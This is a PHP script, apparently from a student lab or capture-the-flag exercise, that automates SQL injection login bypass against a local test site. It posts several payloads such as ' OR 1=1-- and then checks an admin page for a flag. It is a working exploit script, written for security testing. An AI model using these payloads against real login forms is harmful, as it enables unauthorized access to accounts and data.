<?php
/**
 * Operation ShadowTrace - Stage 4 SQL Injection Tester
 * Member 4 - Integration & Testing (LO3)
 */

echo "[*] Stage 4 SQL Injection Tester\n";
echo "[*] Target: http://127.0.0.1/index.php\n";
echo str_repeat("-", 40) . "\n";

$payloads = [
    ["username" => "' OR 1=1--", "password" => "test"],
    ["username" => "affiliate'--", "password" => "test"],
    ["username" => "' OR '1'='1' --", "password" => "x"],
    ["username" => "' OR 1=1 --", "password" => "test"],
];

$cookie = "/tmp/sqli_cookies.txt";

foreach ($payloads as $i => $payload) {
    $num = $i + 1;
    echo "[+] Trying payload $num: {$payload['username']}\n";

    // Clear old cookies
    if (file_exists($cookie)) {
        unlink($cookie);
    }

    // Step 1: POST login
    $ch = curl_init("http://127.0.0.1/index.php");
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($payload),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_COOKIEJAR => $cookie,
        CURLOPT_COOKIEFILE => $cookie,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_HEADER => true,
    ]);

    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
        echo "[!] Connection error: $error\n";
        exit(1);
    }

    // Step 2: Visit admin page with session cookie
    $ch2 = curl_init("http://127.0.0.1/admin.php");
    curl_setopt_array($ch2, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEJAR => $cookie,
        CURLOPT_COOKIEFILE => $cookie,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_FOLLOWLOCATION => true,
    ]);

    $admin = curl_exec($ch2);
    curl_close($ch2);

    if (
        strpos($admin, "SHADOW{web_") !== false ||
        strpos($admin, "Broker Admin Panel") !== false ||
        strpos($response, "SHADOW{web_") !== false
    ) {
        echo "[✓] SUCCESS – SQL Injection works!\n";
        echo "[✓] Payload: username = {$payload['username']}\n";

        if (preg_match('/SHADOW\{[^}]+\}/', $admin . $response, $matches)) {
            echo "[✓] Flag found: {$matches[0]}\n";
        }
        exit(0);
    } else {
        echo "[-] Failed with this payload\n";
    }
}

echo "[!] All payloads failed\n";
echo "[*] Tip: Open http://localhost:8080 in browser and test manually\n";
exit(1);
?>